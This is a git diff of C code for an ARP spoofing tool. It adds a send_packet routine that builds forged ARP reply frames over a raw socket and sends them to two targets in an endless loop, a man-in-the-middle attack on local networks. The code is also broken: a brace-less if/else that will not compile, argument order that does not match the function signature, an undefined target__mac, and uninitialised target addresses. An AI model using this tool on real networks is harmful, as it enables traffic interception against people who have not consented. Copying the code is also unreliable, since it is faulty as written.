@@ -64,22 +64,85 @@ int initialize_inject(const char *gateway_ip, char *target_ip, char *own_ip, con
     // Start the spoofing and analyze packets    
 
     printf("Starting spoofing\n");
-    
 
     uint32_t target_one_ip;
     uint32_t target_two_ip;
-
-    while (1) {
-        arp_spoof(target_one_ip, target_two_ip);
-        arp_spoof(target_two_ip, target_one_ip);   // mac_target_two, own_mac are other args
-        sleep(1);
-    }    
     
+    // 1 = broadcast, 0 = spoof 
+    int spoof = 0;
+    while (1) {
+        send_packet(target_one_ip, target_two_ip, mac_addr_one, own_mac, spoof);
+        send_packet(target_two_ip, target_one_ip, mac_addr_two, own_mac, spoof);   // mac_target_two, own_mac are other args
+        sleep(2);
+    }    
     return 0;
+}
+
+void send_packet(uint32_t target_ip, uint32_t own_ip, uint8_t *own_mac, char *ifname, 
+                 uint8_t *mac_addr, int get_mac_addr) {
+    
+    struct arp_header *arp_hdr;
+    if (!(arp_hdr = malloc(sizeof(struct arp_header)))) {
+        perror("Error in malloc");
+        exit(1);
+    }
+    
+    struct ethernet_header *eth_hdr;
+    if (!(eth_hdr = malloc(IP_MAXPACKET))) {
+        perror("Error in malloc");
+        exit(1);
+    }
+    
+    arp_hdr->hardware_type = htons(1);
+    arp_hdr->protocol_type = htons(ETH_P_IP);
+    arp_hdr->hardware_size = 6;
+    arp_hdr->protocol_size = 4;
+    arp_hdr->opcode = htons(ARPOP_REPLY);         // ARP_REQUEST = 1, ARP_REPLY = 2
+    
+    memcpy(arp_hdr->sha, own_mac, 6);
+    memcpy(arp_hdr->spa, &own_ip, 4);
+    memcpy(arp_hdr->tpa, &target_ip, 4);
+    
+    uint8_t broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+    
+    // Set depending on get_mac_addr value
+    if (get_mac_addr)
+        memset(arp_hdr->tha, 0, 6);
+        memcpy(&eth_hdr->daddr, broadcast_mac, 6);
+    else
+        memset(arp_hdr->tha, target_ip, 6);
+        memcpy(&eth_hdr->daddr, target__mac, 6);
+
+    memcpy(&eth_hdr->saddr, own_mac, 6);
+    memcpy(&eth_hdr->ether_type, (uint8_t[2]){ETH_P_ARP / 256, ETH_P_ARP % 256}, 2); // 0x0806 ARP
+    memcpy((uint8_t *)eth_hdr + ETH_HDR_LEN, arp_hdr, ARP_HDR_LEN);
+
+    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
+    if (sock == -1) {
+        perror("Error: socket()");
+        exit(1);
+    }
+    
+    struct sockaddr_ll device;
+    memset(&device, 0, sizeof(device));
+    device.sll_ifindex = if_nametoindex(ifname);
+    if (!device.sll_ifindex) {
+        perror("Coudn't find index for interface");
+        exit(1);
+    }
+    
+    int bytes_sent = sendto(sock, eth_hdr, (ETH_HDR_LEN + ARP_HDR_LEN), 0, (const struct sockaddr *)&device, sizeof(device));
+    if (bytes_sent < 0) {
+        perror("sendto() failed");
+        exit(1);
+
+    }
 }
 
 
 void get_mac_addr(uint32_t target_ip, uint32_t own_ip, uint8_t *own_mac, char *ifname, uint8_t *mac_addr) {
+    
+    int get_mac_addr = 1;
     
     struct arp_header *arp_hdr;
     if (!(arp_hdr = malloc(sizeof(struct arp_header)))) {
@@ -163,37 +226,5 @@ void get_mac_addr(uint32_t target_ip, uint32_t own_ip, uint8_t *own_mac, char *i
     exit(1);
 }
 
-void arp_spoof(uint32_t ip_target, uint32_t ip_spoof) { 
-/*    
-    struct ethernet_header *eth_hdr = malloc(sizeof(struct ethernet_header));
-    struct arp_header *arp_hdr = malloc(sizeof(struct arp_header));
-    
-    // Make arp packet 
-    arp_hdr->hardware_type = htons(1);
-    arp_hdr->protocol_type = htons(1);
-    arp_hdr->hardware_size = htons(1);
-    arp_hdr->protocol_size = htons(1);
-    arp_hdr->opcode = htons(1);
-    
-    memcpy(arp_hdr->sha, src_mac, 6);
-    memcpy(arp_hdr->spa, src_ip, 4);
-    memcpy(arp_hdr->tha, target_mac, 6);
-    memcpy(arp_hdr->tpa, ip_target, 4);
-    
-    // Make ethernet packet 
-    memcpy(eth_hdr->daddr, target_mac, 6);
-    memcpy(eth_hdr->saddr, src_mac, 6);
-    
-    eth_hdr->ether_type = AF_INET; 
-   
-    if ((sendto(sd, ethernet_packet, sizeof(struct arp_header) + sizeof(struct ethernet_header), 0,
-                    (const struct sockaddr *)device, sizeof(*device))) <= 0) {
-        perror("Error in sendto(): ");
-        exit(1);
-    }
-  */
-    uint32_t ip_send = ip_target;
-
-}
 
 
